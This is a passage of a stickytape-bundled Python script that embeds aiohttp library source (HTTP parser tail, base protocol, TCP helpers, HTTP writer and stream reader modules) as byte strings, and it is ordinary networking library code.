    return True, chunk[2:]\r\n                    # Both CR and LF, or only LF may not be received yet. It is\r\n                    # expected that CRLF or LF will be shown at the very first\r\n                    # byte next time, otherwise trailers should come. The last\r\n                    # CRLF which marks the end of response might not be\r\n                    # contained in the same TCP segment which delivered the\r\n                    # size indicator.\r\n                    if not head:\r\n                        return False, b""\r\n                    if head == SEP[:1]:\r\n                        self._chunk_tail = head\r\n                        return False, b""\r\n                    self._chunk = ChunkState.PARSE_TRAILERS\r\n\r\n                # read and discard trailer up to the CRLF terminator\r\n                if self._chunk == ChunkState.PARSE_TRAILERS:\r\n                    pos = chunk.find(SEP)\r\n                    if pos >= 0:\r\n                        chunk = chunk[pos + 2 :]\r\n                        self._chunk = ChunkState.PARSE_MAYBE_TRAILERS\r\n                    else:\r\n                        self._chunk_tail = chunk\r\n                        return False, b""\r\n\r\n        # Read all bytes until eof\r\n        elif self._type == ParseState.PARSE_UNTIL_EOF:\r\n            self.payload.feed_data(chunk, len(chunk))\r\n\r\n        return False, b""\r\n\r\n\r\nclass DeflateBuffer:\r\n    """DeflateStream decompress stream and feed data into specified stream."""\r\n\r\n    decompressor: Any\r\n\r\n    def __init__(self, out: StreamReader, encoding: Optional[str]) -> None:\r\n        self.out = out\r\n        self.size = 0\r\n        self.encoding = encoding\r\n        self._started_decoding = False\r\n\r\n        if encoding == "br":\r\n            if not HAS_BROTLI:  # pragma: no cover\r\n                raise ContentEncodingError(\r\n                    "Can not decode content-encoding: brotli (br). "\r\n                    "Please install `Brotli`"\r\n                )\r\n\r\n            class BrotliDecoder:\r\n                # Supports both \'brotlipy\' and \'Brotli\' packages\r\n                # since they share an import name. The top branches\r\n                # are for \'brotlipy\' and bottom branches for \'Brotli\'\r\n                def __init__(self) -> None:\r\n                    self._obj = brotli.Decompressor()\r\n\r\n                def decompress(self, data: bytes) -> bytes:\r\n                    if hasattr(self._obj, "decompress"):\r\n                        return cast(bytes, self._obj.decompress(data))\r\n                    return cast(bytes, self._obj.process(data))\r\n\r\n                def flush(self) -> bytes:\r\n                    if hasattr(self._obj, "flush"):\r\n                        return cast(bytes, self._obj.flush())\r\n                    return b""\r\n\r\n            self.decompressor = BrotliDecoder()\r\n        else:\r\n            zlib_mode = 16 + zlib.MAX_WBITS if encoding == "gzip" else zlib.MAX_WBITS\r\n            self.decompressor = zlib.decompressobj(wbits=zlib_mode)\r\n\r\n    def set_exception(self, exc: BaseException) -> None:\r\n        self.out.set_exception(exc)\r\n\r\n    def feed_data(self, chunk: bytes, size: int) -> None:\r\n        if not size:\r\n            return\r\n\r\n        self.size += size\r\n\r\n        # RFC1950\r\n        # bits 0..3 = CM = 0b1000 = 8 = "deflate"\r\n        # bits 4..7 = CINFO = 1..7 = windows size.\r\n        if (\r\n            not self._started_decoding\r\n            and self.encoding == "deflate"\r\n            and chunk[0] & 0xF != 8\r\n        ):\r\n            # Change the decoder to decompress incorrectly compressed data\r\n            # Actually we should issue a warning about non-RFC-compliant data.\r\n            self.decompressor = zlib.decompressobj(wbits=-zlib.MAX_WBITS)\r\n\r\n        try:\r\n            chunk = self.decompressor.decompress(chunk)\r\n        except Exception:\r\n            raise ContentEncodingError(\r\n                "Can not decode content-encoding: %s" % self.encoding\r\n            )\r\n\r\n        self._started_decoding = True\r\n\r\n        if chunk:\r\n            self.out.feed_data(chunk, len(chunk))\r\n\r\n    def feed_eof(self) -> None:\r\n        chunk = self.decompressor.flush()\r\n\r\n        if chunk or self.size > 0:\r\n            self.out.feed_data(chunk, len(chunk))\r\n            if self.encoding == "deflate" and not self.decompressor.eof:\r\n                raise ContentEncodingError("deflate")\r\n\r\n        self.out.feed_eof()\r\n\r\n    def begin_http_chunk_receiving(self) -> None:\r\n        self.out.begin_http_chunk_receiving()\r\n\r\n    def end_http_chunk_receiving(self) -> None:\r\n        self.out.end_http_chunk_receiving()\r\n\r\n\r\nHttpRequestParserPy = HttpRequestParser\r\nHttpResponseParserPy = HttpResponseParser\r\nRawRequestMessagePy = RawRequestMessage\r\nRawResponseMessagePy = RawResponseMessage\r\n\r\ntry:\r\n    if not NO_EXTENSIONS:\r\n        from ._http_parser import (  # type: ignore[import,no-redef]\r\n            HttpRequestParser,\r\n            HttpResponseParser,\r\n            RawRequestMessage,\r\n            RawResponseMessage,\r\n        )\r\n\r\n        HttpRequestParserC = HttpRequestParser\r\n        HttpResponseParserC = HttpResponseParser\r\n        RawRequestMessageC = RawRequestMessage\r\n        RawResponseMessageC = RawResponseMessage\r\nexcept ImportError:  # pragma: no cover\r\n    pass\r\n')
    __stickytape_write_module('aiohttp/base_protocol.py', b'import asyncio\r\nfrom typing import Optional, cast\r\n\r\nfrom .tcp_helpers import tcp_nodelay\r\n\r\n\r\nclass BaseProtocol(asyncio.Protocol):\r\n    __slots__ = (\r\n        "_loop",\r\n        "_paused",\r\n        "_drain_waiter",\r\n        "_connection_lost",\r\n        "_reading_paused",\r\n        "transport",\r\n    )\r\n\r\n    def __init__(self, loop: asyncio.AbstractEventLoop) -> None:\r\n        self._loop = loop  # type: asyncio.AbstractEventLoop\r\n        self._paused = False\r\n        self._drain_waiter = None  # type: Optional[asyncio.Future[None]]\r\n        self._connection_lost = False\r\n        self._reading_paused = False\r\n\r\n        self.transport = None  # type: Optional[asyncio.Transport]\r\n\r\n    def pause_writing(self) -> None:\r\n        assert not self._paused\r\n        self._paused = True\r\n\r\n    def resume_writing(self) -> None:\r\n        assert self._paused\r\n        self._paused = False\r\n\r\n        waiter = self._drain_waiter\r\n        if waiter is not None:\r\n            self._drain_waiter = None\r\n            if not waiter.done():\r\n                waiter.set_result(None)\r\n\r\n    def pause_reading(self) -> None:\r\n        if not self._reading_paused and self.transport is not None:\r\n            try:\r\n                self.transport.pause_reading()\r\n            except (AttributeError, NotImplementedError, RuntimeError):\r\n                pass\r\n            self._reading_paused = True\r\n\r\n    def resume_reading(self) -> None:\r\n        if self._reading_paused and self.transport is not None:\r\n            try:\r\n                self.transport.resume_reading()\r\n            except (AttributeError, NotImplementedError, RuntimeError):\r\n                pass\r\n            self._reading_paused = False\r\n\r\n    def connection_made(self, transport: asyncio.BaseTransport) -> None:\r\n        tr = cast(asyncio.Transport, transport)\r\n        tcp_nodelay(tr, True)\r\n        self.transport = tr\r\n\r\n    def connection_lost(self, exc: Optional[BaseException]) -> None:\r\n        self._connection_lost = True\r\n        # Wake up the writer if currently paused.\r\n        self.transport = None\r\n        if not self._paused:\r\n            return\r\n        waiter = self._drain_waiter\r\n        if waiter is None:\r\n            return\r\n        self._drain_waiter = None\r\n        if waiter.done():\r\n            return\r\n        if exc is None:\r\n            waiter.set_result(None)\r\n        else:\r\n            waiter.set_exception(exc)\r\n\r\n    async def _drain_helper(self) -> None:\r\n        if self._connection_lost:\r\n            raise ConnectionResetError("Connection lost")\r\n        if not self._paused:\r\n            return\r\n        waiter = self._drain_waiter\r\n        if waiter is None:\r\n            waiter = self._loop.create_future()\r\n            self._drain_waiter = waiter\r\n        await asyncio.shield(waiter)\r\n')
    __stickytape_write_module('aiohttp/tcp_helpers.py', b'"""Helper methods to tune a TCP connection"""\r\n\r\nimport asyncio\r\nimport socket\r\nfrom contextlib import suppress\r\nfrom typing import Optional  # noqa\r\n\r\n__all__ = ("tcp_keepalive", "tcp_nodelay")\r\n\r\n\r\nif hasattr(socket, "SO_KEEPALIVE"):\r\n\r\n    def tcp_keepalive(transport: asyncio.Transport) -> None:\r\n        sock = transport.get_extra_info("socket")\r\n        if sock is not None:\r\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)\r\n\r\n\r\nelse:\r\n\r\n    def tcp_keepalive(transport: asyncio.Transport) -> None:  # pragma: no cover\r\n        pass\r\n\r\n\r\ndef tcp_nodelay(transport: asyncio.Transport, value: bool) -> None:\r\n    sock = transport.get_extra_info("socket")\r\n\r\n    if sock is None:\r\n        return\r\n\r\n    if sock.family not in (socket.AF_INET, socket.AF_INET6):\r\n        return\r\n\r\n    value = bool(value)\r\n\r\n    # socket may be closed already, on windows OSError get raised\r\n    with suppress(OSError):\r\n        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, value)\r\n')
    __stickytape_write_module('aiohttp/http_writer.py', b'"""Http related parsers and protocol."""\r\n\r\nimport asyncio\r\nimport zlib\r\nfrom typing import Any, Awaitable, Callable, NamedTuple, Optional, Union  # noqa\r\n\r\nfrom multidict import CIMultiDict\r\n\r\nfrom .abc import AbstractStreamWriter\r\nfrom .base_protocol import BaseProtocol\r\nfrom .helpers import NO_EXTENSIONS\r\n\r\n__all__ = ("StreamWriter", "HttpVersion", "HttpVersion10", "HttpVersion11")\r\n\r\n\r\nclass HttpVersion(NamedTuple):\r\n    major: int\r\n    minor: int\r\n\r\n\r\nHttpVersion10 = HttpVersion(1, 0)\r\nHttpVersion11 = HttpVersion(1, 1)\r\n\r\n\r\n_T_OnChunkSent = Optional[Callable[[bytes], Awaitable[None]]]\r\n_T_OnHeadersSent = Optional[Callable[["CIMultiDict[str]"], Awaitable[None]]]\r\n\r\n\r\nclass StreamWriter(AbstractStreamWriter):\r\n    def __init__(\r\n        self,\r\n        protocol: BaseProtocol,\r\n        loop: asyncio.AbstractEventLoop,\r\n        on_chunk_sent: _T_OnChunkSent = None,\r\n        on_headers_sent: _T_OnHeadersSent = None,\r\n    ) -> None:\r\n        self._protocol = protocol\r\n        self._transport = protocol.transport\r\n\r\n        self.loop = loop\r\n        self.length = None\r\n        self.chunked = False\r\n        self.buffer_size = 0\r\n        self.output_size = 0\r\n\r\n        self._eof = False\r\n        self._compress = None  # type: Any\r\n        self._drain_waiter = None\r\n\r\n        self._on_chunk_sent = on_chunk_sent  # type: _T_OnChunkSent\r\n        self._on_headers_sent = on_headers_sent  # type: _T_OnHeadersSent\r\n\r\n    @property\r\n    def transport(self) -> Optional[asyncio.Transport]:\r\n        return self._transport\r\n\r\n    @property\r\n    def protocol(self) -> BaseProtocol:\r\n        return self._protocol\r\n\r\n    def enable_chunking(self) -> None:\r\n        self.chunked = True\r\n\r\n    def enable_compression(\r\n        self, encoding: str = "deflate", strategy: int = zlib.Z_DEFAULT_STRATEGY\r\n    ) -> None:\r\n        zlib_mode = 16 + zlib.MAX_WBITS if encoding == "gzip" else zlib.MAX_WBITS\r\n        self._compress = zlib.compressobj(wbits=zlib_mode, strategy=strategy)\r\n\r\n    def _write(self, chunk: bytes) -> None:\r\n        size = len(chunk)\r\n        self.buffer_size += size\r\n        self.output_size += size\r\n\r\n        if self._transport is None or self._transport.is_closing():\r\n            raise ConnectionResetError("Cannot write to closing transport")\r\n        self._transport.write(chunk)\r\n\r\n    async def write(\r\n        self, chunk: bytes, *, drain: bool = True, LIMIT: int = 0x10000\r\n    ) -> None:\r\n        """Writes chunk of data to a stream.\r\n\r\n        write_eof() indicates end of stream.\r\n        writer can\'t be used after write_eof() method being called.\r\n        write() return drain future.\r\n        """\r\n        if self._on_chunk_sent is not None:\r\n            await self._on_chunk_sent(chunk)\r\n\r\n        if isinstance(chunk, memoryview):\r\n            if chunk.nbytes != len(chunk):\r\n                # just reshape it\r\n                chunk = chunk.cast("c")\r\n\r\n        if self._compress is not None:\r\n            chunk = self._compress.compress(chunk)\r\n            if not chunk:\r\n                return\r\n\r\n        if self.length is not None:\r\n            chunk_len = len(chunk)\r\n            if self.length >= chunk_len:\r\n                self.length = self.length - chunk_len\r\n            else:\r\n                chunk = chunk[: self.length]\r\n                self.length = 0\r\n                if not chunk:\r\n                    return\r\n\r\n        if chunk:\r\n            if self.chunked:\r\n                chunk_len_pre = ("%x\\r\\n" % len(chunk)).encode("ascii")\r\n                chunk = chunk_len_pre + chunk + b"\\r\\n"\r\n\r\n            self._write(chunk)\r\n\r\n            if self.buffer_size > LIMIT and drain:\r\n                self.buffer_size = 0\r\n                await self.drain()\r\n\r\n    async def write_headers(\r\n        self, status_line: str, headers: "CIMultiDict[str]"\r\n    ) -> None:\r\n        """Write request/response status and headers."""\r\n        if self._on_headers_sent is not None:\r\n            await self._on_headers_sent(headers)\r\n\r\n        # status + headers\r\n        buf = _serialize_headers(status_line, headers)\r\n        self._write(buf)\r\n\r\n    async def write_eof(self, chunk: bytes = b"") -> None:\r\n        if self._eof:\r\n            return\r\n\r\n        if chunk and self._on_chunk_sent is not None:\r\n            await self._on_chunk_sent(chunk)\r\n\r\n        if self._compress:\r\n            if chunk:\r\n                chunk = self._compress.compress(chunk)\r\n\r\n            chunk = chunk + self._compress.flush()\r\n            if chunk and self.chunked:\r\n                chunk_len = ("%x\\r\\n" % len(chunk)).encode("ascii")\r\n                chunk = chunk_len + chunk + b"\\r\\n0\\r\\n\\r\\n"\r\n        else:\r\n            if self.chunked:\r\n                if chunk:\r\n                    chunk_len = ("%x\\r\\n" % len(chunk)).encode("ascii")\r\n                    chunk = chunk_len + chunk + b"\\r\\n0\\r\\n\\r\\n"\r\n                else:\r\n                    chunk = b"0\\r\\n\\r\\n"\r\n\r\n        if chunk:\r\n            self._write(chunk)\r\n\r\n        await self.drain()\r\n\r\n        self._eof = True\r\n        self._transport = None\r\n\r\n    async def drain(self) -> None:\r\n        """Flush the write buffer.\r\n\r\n        The intended use is to write\r\n\r\n          await w.write(data)\r\n          await w.drain()\r\n        """\r\n        if self._protocol.transport is not None:\r\n            await self._protocol._drain_helper()\r\n\r\n\r\ndef _safe_header(string: str) -> str:\r\n    if "\\r" in string or "\\n" in string:\r\n        raise ValueError(\r\n            "Newline or carriage return detected in headers. "\r\n            "Potential header injection attack."\r\n        )\r\n    return string\r\n\r\n\r\ndef _py_serialize_headers(status_line: str, headers: "CIMultiDict[str]") -> bytes:\r\n    headers_gen = (_safe_header(k) + ": " + _safe_header(v) for k, v in headers.items())\r\n    line = status_line + "\\r\\n" + "\\r\\n".join(headers_gen) + "\\r\\n\\r\\n"\r\n    return line.encode("utf-8")\r\n\r\n\r\n_serialize_headers = _py_serialize_headers\r\n\r\ntry:\r\n    import aiohttp._http_writer as _http_writer  # type: ignore[import]\r\n\r\n    _c_serialize_headers = _http_writer._serialize_headers\r\n    if not NO_EXTENSIONS:\r\n        _serialize_headers = _c_serialize_headers\r\nexcept ImportError:\r\n    pass\r\n')
    __stickytape_write_module('aiohttp/streams.py', b'import asyncio\r\nimport collections\r\nimport warnings\r\nfrom typing import Awaitable, Callable, Deque, Generic, List, Optional, Tuple, TypeVar\r\n\r\nfrom .base_protocol import BaseProtocol\r\nfrom .helpers import BaseTimerContext, set_exception, set_result\r\nfrom .log import internal_logger\r\nfrom .typedefs import Final\r\n\r\n__all__ = (\r\n    "EMPTY_PAYLOAD",\r\n    "EofStream",\r\n    "StreamReader",\r\n    "DataQueue",\r\n    "FlowControlDataQueue",\r\n)\r\n\r\n_T = TypeVar("_T")\r\n\r\n\r\nclass EofStream(Exception):\r\n    """eof stream indication."""\r\n\r\n\r\nclass AsyncStreamIterator(Generic[_T]):\r\n    def __init__(self, read_func: Callable[[], Awaitable[_T]]) -> None:\r\n        self.read_func = read_func\r\n\r\n    def __aiter__(self) -> "AsyncStreamIterator[_T]":\r\n        return self\r\n\r\n    async def __anext__(self) -> _T:\r\n        try:\r\n            rv = await self.read_func()\r\n        except EofStream:\r\n            raise StopAsyncIteration\r\n        if rv == b"":\r\n            raise StopAsyncIteration\r\n        return rv\r\n\r\n\r\nclass ChunkTupleAsyncStreamIterator:\r\n    def __init__(self, stream: "StreamReader") -> None:\r\n        self._stream = stream\r\n\r\n    def __aiter__(self) -> "ChunkTupleAsyncStreamIterator":\r\n        return self\r\n\r\n    async def __anext__(self) -> Tuple[bytes, bool]:\r\n        rv = await self._stream.readchunk()\r\n        if rv == (b"", False):\r\n            raise StopAsyncIteration\r\n        return rv\r\n\r\n\r\nclass AsyncStreamReaderMixin:\r\n    def __aiter__(self) -> AsyncStreamIterator[bytes]:\r\n        return AsyncStreamIterator(self.readline)  # type: ignore[attr-defined]\r\n\r\n    def iter_chunked(self, n: int) -> AsyncStreamIterator[bytes]:\r\n        """Returns an asynchronous iterator that yields chunks of size n.\r\n\r\n        Python-3.5 available for Python 3.5+ only\r\n        """\r\n        return AsyncStreamIterator(\r\n            lambda: self.read(n)  # type: ignore[attr-defined,no-any-return]\r\n        )\r\n\r\n    def iter_any(self) -> AsyncStreamIterator[bytes]:\r\n        """Yield all available data as soon as it is received.\r\n\r\n        Python-3.5 available for Python 3.5+ only\r\n        """\r\n        return AsyncStreamIterator(self.readany)  # type: ignore[attr-defined]\r\n\r\n    def iter_chunks(self) -> ChunkTupleAsyncStreamIterator:\r\n        """Yield chunks of data as they are received by the server.\r\n\r\n        The yielded objects are tuples\r\n        of (bytes, bool) as returned by the StreamReader.readchunk method.\r\n\r\n        Python-3.5 available for Python 3.5+ only\r\n        """\r\n        return ChunkTupleAsyncStreamIterator(self)  # type: ignore[arg-type]\r\n\r\n\r\nclass StreamReader(AsyncStreamReaderMixin):\r\n    """An enhancement of asyncio.StreamReader.\r\n\r\n    Supports asynchronous iteration by line, chunk or as available::\r\n\r\n        async for line in reader:\r\n            ...\r\n        async for chunk in reader.iter_chunked(1024):\r\n            ...\r\n        async for slice in reader.iter_any():\r\n            ...\r\n\r\n    """\r\n\r\n    total_bytes = 0\r\n\r\n    def __init__(\r\n        self,\r\n        protocol: BaseProtocol,\r\n        limit: int,\r\n        *,\r\n        timer: Optional[BaseTimerContext] = None,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ) -> None:\r\n        self._protocol = protocol\r\n        self._low_water = limit\r\n        self._high_water = limit * 2\r\n        if loop is None:\r\n            loop = asyncio.get_event_loop()\r\n        self._loop = loop\r\n        self._size = 0\r\n        self._cursor = 0\r\n        self._http_chunk_splits = None  # type: Optional[List[int]]\r\n        self._buffer = collections.deque()  # type: Deque[bytes]\r\n        self._buffer_offset = 0\r\n        self._eof = False\r\n        self._waiter = None  # type: Optional[asyncio.Future[None]]\r\n        self._eof_waiter = None  # type: Optional[asyncio.Future[None]]\r\n        self._exception = None  # type: Optional[BaseException]\r\n        self._timer = timer\r\n        self._eof_callbacks = []  # type: List[Callable[[], None]]\r\n\r\n    def __repr__(self) -> str:\r\n        info = [self.__class__.__name__]\r\n        if self._size:\r\n            info.append("%d bytes" % self._size)\r\n        if self._eof:\r\n            info.append("eof")\r\n        if self._low_water != 2 ** 16:  # default limit\r\n            info.append("low=%d high=%d" % (self._low_water, self._high_water))\r\n        if self._waiter:\r\n            info.append("w=%r" % self._waiter)\r\n        if self._exception:\r\n            info.append("e=%r" % self._exception)\r\n        return "<%s>" % " ".join(info)\r\n\r\n    def get_read_buffer_limits(self) -> Tuple[int, int]:\r\n        return (self._low_water, self._high_water)\r\n\r\n    def exception(self) -> Optional[BaseException]:\r\n        return self._exception\r\n\r\n    def set_exception(self, exc: BaseException) -> None:\r\n        self._exception = exc\r\n        self._eof_callbacks.clear()\r\n\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_exception(waiter, exc)\r\n\r\n        waiter = self._eof_waiter\r\n        if waiter is not None:\r\n            self._eof_waiter = None\r\n            set_exception(waiter, exc)\r\n\r\n    def on_eof(self, callback: Callable[[], None]) -> None:\r\n        if self._eof:\r\n            try:\r\n                callback()\r\n            except Exception:\r\n                internal_logger.exception("Exception in eof callback")\r\n        else:\r\n            self._eof_callbacks.append(callback)\r\n\r\n    def feed_eof(self) -> None:\r\n        self._eof = True\r\n\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_result(waiter, None)\r\n\r\n        waiter = self._eof_waiter\r\n        if waiter is not None:\r\n            self._eof_waiter = None\r\n            set_result(waiter, None)\r\n\r\n        for cb in self._eof_callbacks:\r\n            try:\r\n                cb()\r\n            except Exception:\r\n                internal_logger.exception("Exception in eof callback")\r\n\r\n        self._eof_callbacks.clear()\r\n\r\n    def is_eof(self) -> bool:\r\n        """Return True if  \'feed_eof\' was called."""\r\n        return self._eof\r\n\r\n    def at_eof(self) -> bool:\r\n        """Return True if the buffer is empty and \'feed_eof\' was called."""\r\n        return self._eof and not self._buffer\r\n\r\n    async def wait_eof(self) -> None:\r\n        if self._eof:\r\n            return\r\n\r\n        assert self._eof_waiter is None\r\n        self._eof_waiter = self._loop.create_future()\r\n        try:\r\n            await self._eof_waiter\r\n        finally:\r\n            self._eof_waiter = None\r\n\r\n    def unread_data(self, data: bytes) -> None:\r\n        """rollback reading some data from stream, inserting it to buffer head."""\r\n        warnings.warn(\r\n            "unread_data() is deprecated "\r\n            "and will be removed in future releases (#3260)",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n        if not data:\r\n            return\r\n\r\n        if self._buffer_offset:\r\n            self._buffer[0] = self._buffer[0][self._buffer_offset :]\r\n            self._buffer_offset = 0\r\n        self._size += len(data)\r\n        self._cursor -= len(data)\r\n        self._buffer.appendleft(data)\r\n        self._eof_counter = 0\r\n\r\n    # TODO: size is ignored, remove the param later\r\n    def feed_data(self, data: bytes, size: int = 0) -> None:\r\n        assert not self._eof, "feed_data after feed_eof"\r\n\r\n        if not data:\r\n            return\r\n\r\n        self._size += len(data)\r\n        self._buffer.append(data)\r\n        self.total_bytes += len(data)\r\n\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_result(waiter, None)\r\n\r\n        if self._size > self._high_water and not self._protocol._reading_paused:\r\n            self._protocol.pause_reading()\r\n\r\n    def begin_http_chunk_receiving(self) -> None:\r\n        if self._http_chunk_splits is None:\r\n            if self.total_bytes:\r\n                raise RuntimeError(\r\n                    "Called begin_http_chunk_receiving when" "some data was already fed"\r\n                )\r\n            self._http_chunk_splits = []\r\n\r\n    def end_http_chunk_receiving(self) -> None:\r\n        if self._http_chunk_splits is None:\r\n            raise RuntimeError(\r\n                "Called end_chunk_receiving without calling "\r\n                "begin_chunk_receiving first"\r\n            )\r\n\r\n        # self._http_chunk_splits contains logical byte offsets from start of\r\n        # the body transfer. Each offset is the offset of the end of a chunk.\r\n        # "Logical" means bytes, accessible for a user.\r\n        # If no chunks containig logical data were received, current position\r\n        # is difinitely zero.\r\n        pos = self._http_chunk_splits[-1] if self._http_chunk_splits else 0\r\n\r\n        if self.total_bytes == pos:\r\n            # We should not add empty chunks here. So we check for that.\r\n            # Note, when chunked + gzip is used, we can receive a chunk\r\n            # of compressed data, but that data may not be enough for gzip FSM\r\n            # to yield any uncompressed data. That\'s why current position may\r\n            # not change after receiving a chunk.\r\n            return\r\n\r\n        self._http_chunk_splits.append(self.total_bytes)\r\n\r\n        # wake up readchunk when end of http chunk received\r\n        waiter = self._waiter\r\n        if waiter is not None:\r\n            self._waiter = None\r\n            set_result(waiter, None)\r\n\r\n    async def _wait(self, func_name: str) -> None:\r\n        # StreamReader uses a future to link the protocol feed_data() method\r\n        # to a read coroutine. Running two read coroutines at the same time\r\n        # would have an unexpected behaviour. It would not possible to know\r\n        # which coroutine would get the next data.\r\n        if self._waiter is not None:\r\n            raise RuntimeError(\r\n                "%s() called while another coroutine is "\r\n                "already waiting for incoming data" % func_name\r\n            )\r\n\r\n        waiter = self._waiter = self._loop.create_future()\r\n        try:\r\n            if self._timer:\r\n                with self._timer:\r\n                    await waiter\r\n            else:\r\n                await waiter\r\n        finally:\r\n            self._waiter = None\r\n\r\n    async def readline(self) -> bytes:\r\n        return await self.readuntil()\r\n\r\n    async def readuntil(self, separator: bytes = b"\\n") -> bytes:\r\n        seplen = len(separator)\r\n        if seplen == 0:\r\n            raise ValueError("Separator should be at least one-byte string")\r\n\r\n        if self._exception is not None:\r\n            raise self._exception\r\n\r\n        chunk = b""\r\n        chunk_size = 0\r\n        not_enough = True\r\n\r\n        while not_enough:\r\n            while self._buffer and not_enough:\r\n                offset = self._buffer_offset\r\n                ichar = self._buffer[0].find(separator, offset) + 1\r\n                # Read from current offset to found separator or to the end.\r\n                data = self._read_nowait_chunk(ichar - offset if ichar else -1)\r\n                chunk += data\r\n                chunk_size += len(data)\r\n                if ichar:\r\n                    not_enough = False\r\n\r\n                if chunk_size > self._high_water:\r\n                    raise ValueError("Chunk too big")\r\n\r\n            if self._eof:\r\n                break\r\n\r\n            if not_enough:\r\n                await self._wait("readuntil")\r\n\r\n        return chunk\r\n\r\n    async def read(self, n: int = -1) -> bytes:\r\n        if self._exception is not None:\r\n            raise self._exception\r\n\r\n        # migration problem; with DataQueue you have to catch\r\n        # EofStream exception, so common way is to run payload.read() inside\r\n        # infinite loop. what can cause real infinite loop with StreamReader\r\n        # lets keep this code one major release.\r\n        if __debug__:\r\n            if self._eof and not self._buffer:\r\n                self._eof_counter = getattr(self, "_eof_counter", 0) + 1\r\n                if self._eof_counter > 5:\r\n                    internal_logger.warning(\r\n                        "Multiple access to StreamReader in eof state, "\r\n                        "might be infinite loop.",\r\n                        stack_info=True,\r\n                    )\r\n\r\n        if not n:\r\n            return b""\r\n\r\n        if n < 0:\r\n            # This used to just loop creating a new waiter hoping to\r\n            # collect everything in self._buffer, but that would\r\n            # deadlock if the subprocess sends more than self.limit\r\n            # bytes.  So just call self.readany() until EOF.\r\n            blocks = []\r\n            while True:\r\n                block = await self.readany()\r\n                if not block:\r\n                    break\r\n                blocks.append(block)\r\n            return b"".join(blocks)\r\n\r\n        # TODO: should be `if` instead of `while`\r\n        # because waiter maybe triggered on chunk end,\r\n        # without feeding any data\r\n        while not self._buffer and not self._eof:\r\n            await self._wait("read")\r\n\r\n        return self._read_nowait(n)\r\n\r\n    async def readany(self) -> bytes:\r\n        if self._exception is not None:\r\n            raise self._exception\r\n\r\n        # TODO: should be `if` instead of `while`\r\n        # because waiter maybe triggered on chunk end,\r\n        # without feeding any data\r\n        while not self._buffer and not self._eof:\r\n            await self._wait("readany")\r\n\r\n        return self._read_nowait(-1)\r\n\r\n    async def readchunk(self) -> Tuple[bytes, bool]:\r\n        """Returns a tuple of (data, end_of_http_chunk).\r\n\r\n        When chunked transfer\r\n        encoding is used, end_of_http_chunk is a boolean indicating if the end\r\n        of the data corresponds to the end of a HTTP chunk , otherwise it is\r\n        always False.\r\n        """\r\n        while True:\r\n            if self._exception is not None:\r\n                raise self._exception\r\n\r\n            while self._http_chunk_splits:\r\n                pos = self._http_chunk_splits.pop(0)\r\n                if pos == self._cursor:\r\n                    return (b"", True)\r\n                if pos > self._cursor:\r\n                    return (self._read_nowait(pos - self._cursor), True)\r\n                internal_logger.warning(\r\n                    "Skipping HTTP chunk end due to data "\r\n                    "consumption beyond chunk boundary"\r\n                )\r\n\r\n            if self._buffer:\r\n                return (self._read_nowait_chunk(-1), False)\r\n                # return (self._read_nowait(-1), False)\r\n\r\n            if self._eof:\r\n                # Special case for signifying EOF.\r\n                # (b\'\', True) is not a final return value actually.\r\n                return (b"", False)\r\n\r\n            await self._wait("readchunk")\r\n\r\n    async def readexactly(self, n: int) -> bytes:\r\n        if self._exception is not None:\r\n            raise self._exception\r\n\r\n        blocks = []  # type: List[bytes]\r\n        while n > 0:\r\n            block = await self.read(n)\r\n            if not block:\r\n                partial = b"".join(blocks)\r\n                raise asyncio.IncompleteReadError(partial, len(partial) + n)\r\n            blocks.append(block)\r\n            n -= len(block)\r\n\r\n        return b"".join(blocks)\r\n\r\n    def read_nowait(self, n: int = -1) -> bytes:\r\n        # default was changed to be consistent with .read(-1)\r\n        #\r\n        # I believe the most users don\'t know about the method and\r\n        # they are not affected.\r\n        if self._exception is not None:\r\n            raise self._exception\r\n\r\n        if self._waiter and not self._waiter.done():\r\n            raise RuntimeError(\r\n                "Called while some coroutine is waiting for incoming data."\r\n            )\r\n\r\n        return self._read_nowait(n)\r\n\r\n    def _read_nowait_chunk(self, n: int) -> bytes:\r\n        first_buffer = self._buffer[0]\r\n        offset = self._buffer_offset\r\n        if n != -1 and len(first_buffer) - offset > n:\r\n            data = first_buffer[offset : offset + n]\r\n            self._buffer_offset += n\r\n\r\n        elif offset:\r\n            self._buffer.popleft()\r\n            data = first_buffer[offset:]\r\n            self._buffer_offset = 0\r\n\r\n        else:\r\n            data = self._buffer.popleft()\r\n\r\n        self._size -= len(data)\r\n        self._cursor += len(data)\r\n\r\n        chunk_splits = self._http_chunk_splits\r\n        # Prevent memory leak: drop useless chunk splits\r\n        while chunk_splits and chunk_splits[0] < self._cursor:\r\n            chunk_splits.pop(0)\r\n\r\n        if self._size < self._low_water and self._protocol._reading_paused:\r\n            self._protocol.resume_reading()\r\n        return data\r\n\r\n    def _read_nowait(self, n: int) -> bytes:\r\n        """Read not more than n bytes, or whole buffer if n == -1"""\r\n        chunks = []\r\n\r\n        while self._buffer:\r\n            chunk = self._read_nowait_chunk(n)\r\n            chunks.append(chunk)\r\n            if n != -1:\r\n                n -= len(chunk)\r\n                if n == 0:\r\n                    break\r\n\r\n        return b"".join(chunks) if chunks else b""\r\n\r\n\r\nclass EmptyStreamReader(StreamReader):  # lgtm [py/missing-call-to-init]\r\n    def __init__(self) -> None:\r\n        pass\r\n\r\n    def exception(self) -> Optional[BaseException]:\r\n        return None\r\n\r\n    def set_exception(self, exc: BaseException) -> None:\r\n        pass\r\n\r\n    def on_eof(self, callback: Callable[[], None]) -> None:\r\n        try:\r\n            callback()\r\n        except Exception:\r\n            internal_logger.exception("Exception in eof callback")\r\n\r\n    def feed_eof(self) -> None:\r\n        pass\r\n\r\n    def is_eof(self) -> bool:\r\n        return True\r\n\r\n    def at_eof(self) -> bool:\r\n        return True\r\n\r\n    async def wait_eof(self) -> None:\r\n        return\r\n\r\n    def feed_data(self, data: bytes, n: int = 0) -> None:\r\n        pass\r\n\r\n    async def readline(self) -> bytes:\r\n        return b""\r\n\r\n    async def read(self, n: int = -1) -> bytes:\r\n        return b""\r\n\r\n    # TODO add async def readuntil\r\n\r\n    async def readany(self) -> bytes:\r\n        return 